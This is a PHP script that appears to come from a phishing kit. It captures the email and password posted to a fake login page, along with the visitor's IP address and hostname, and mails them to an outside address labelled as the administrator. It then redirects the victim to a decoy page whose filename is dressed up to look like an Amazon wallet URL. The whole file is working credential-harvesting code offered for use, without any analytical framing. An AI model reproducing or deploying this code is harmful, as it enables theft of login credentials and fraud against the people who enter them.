<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==========[LOGIN INFOS]=========<br>\n";
$bilsmg .= "|login : ".$_POST['email']."<br>\n";
$bilsmg .= "|Password : ".$_POST['password']."<br>\n";
$bilsmg .= "=============[INFOS]============<br>\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@us-en.info";
$bilsub = "Mamakjhon Login | From $ip";
$bilhead = "From:Masuk Mall <Don>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../clientContext=client-amazon.workspaces&oq=client+amazon&aqs=chrome.0.0i19j69i57j0i19j69i65l2j69i60l3.2679j0j4&sourceid=chrome&ie=UTF-8.wallet.ref_=ya_d_l_pmt_mpo.html";
header("location:$src");
?>